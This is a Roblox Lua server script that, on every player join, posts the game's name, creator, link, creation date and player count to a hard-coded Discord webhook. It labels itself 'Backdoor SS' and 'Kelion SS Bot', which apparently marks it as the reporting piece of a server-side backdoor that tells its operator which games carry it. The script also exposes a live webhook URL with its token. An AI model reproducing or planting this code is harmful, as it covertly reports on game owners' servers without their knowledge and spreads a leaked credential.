local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local webhookUrl = "https://discord.com/api/webhooks/1415675504379432980/nDz6IQXkJcuRJxgpk1_W23GXXKY5Iy3TVm9mjjeiA9M1Y-XG4yaesXWntzQH7Chs3VM2"
local function formatDate(isoDateString)
	local datePart = isoDateString:match("^(%d%d%d%d%-%d%d%-%d%d)")
	return datePart or isoDateString
end

local function sendWebhook(player)
	local success, gameInfo = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	if not success then
		warn("Failed to get game info: " .. tostring(gameInfo))
		return
	end

	local activePlayers = #Players:GetPlayers()
	local visitedPlayers = gameInfo.TotalVisits or 0

	-- Manually build a reliable game icon URL:
	local iconUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. tostring(game.PlaceId) .. "&width=150&height=150&format=png"

	local data = {
		username = "Backdoor SS ",
		embeds = {{
			title = "🎮 Player Joined: " .. player.Name,
			color = 0xFF0000,
			thumbnail = {
				url = iconUrl,
			},
			image = {
				url = iconUrl,
			},
			fields = {
				{name = "🕹 Game", value = gameInfo.Name, inline = true},
				{name = "👑 Creator", value = (gameInfo.Creator and gameInfo.Creator.Name) or "Unknown", inline = true},
				{name = "🔗 Game Link", value = "https://www.roblox.com/games/" .. game.PlaceId, inline = false},
				{name = "📅 Created On", value = formatDate(gameInfo.Created), inline = true},
				{name = "👥 Active Players", value = tostring(activePlayers), inline = true},
			},
			footer = {
				text = "Kelion SS Bot",
			},
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local jsonData = HttpService:JSONEncode(data)

	local ok, err = pcall(function()
		HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
	end)

	if not ok then
		warn("Failed to send webhook: " .. tostring(err))
	end
end

Players.PlayerAdded:Connect(function(player)
	sendWebhook(player)
end)
